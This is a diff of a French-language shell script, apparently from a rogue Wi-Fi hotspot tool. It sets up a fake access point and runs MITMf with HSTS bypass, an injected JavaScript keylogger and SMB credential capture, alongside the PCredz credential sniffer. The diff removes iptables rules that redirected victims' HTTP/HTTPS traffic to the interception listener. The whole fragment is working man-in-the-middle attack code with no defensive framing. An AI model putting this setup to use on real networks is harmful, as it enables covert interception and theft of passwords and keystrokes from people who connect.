@@ -145,17 +145,6 @@ sleep 1
 ifconfig at0 10.0.0.1 netmask 255.255.255.0
 ifconfig at0 mtu 1400
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
-iptables --flush
-iptables --flush --table nat
-iptables --delete-chain
-iptables --table nat --delete-chain
-echo 1 > /proc/sys/net/ipv4/ip_forward
-iptables -t nat -A PREROUTING -p udp -j DNAT --to $gatewayip
-iptables -P FORWARD ACCEPT
-iptables --append FORWARD --in-interface at0 -j ACCEPT
-iptables --table nat -A POSTROUTING --out-interface $internet_interface -j MASQUERADE
-iptables --table nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $listenport   #HTTP
-iptables --table nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports $listenport #HTTPS
 sleep 3
 
 # DHCP
@@ -173,7 +162,7 @@ sleep 1
 echo -e "$info\n[$q+$info] Configuration et démarrage de MITMf $warn"
 cd /etc/MITMf
 echo -e "$txtrst"
-python mitmf.py -i at0 --hsts -f -k --sniffer -a & mitmfid=$!
+python mitmf.py -i at0 --hsts --favicon -k -a --log-level debug --jskeylogger --smbauth & mitmfid=$!
 cd /etc/myHotspot
 sleep 4
 
@@ -210,11 +199,6 @@ kill ${pcredzid}
 echo -e "$info[$q✔$info] PCredz stoppé $warn"
 sleep 1
 echo "0" > /proc/sys/net/ipv4/ip_forward
-iptables -F
-iptables -F -t nat
-iptables --delete-chain
-iptables -t nat --delete-chain
-echo -e "$info[$q✔$info] iptables restaurée $txtrst\n"
 sleep 1
 airmon-ng stop $fakeap_interface
 airmon-ng stop $fakeap
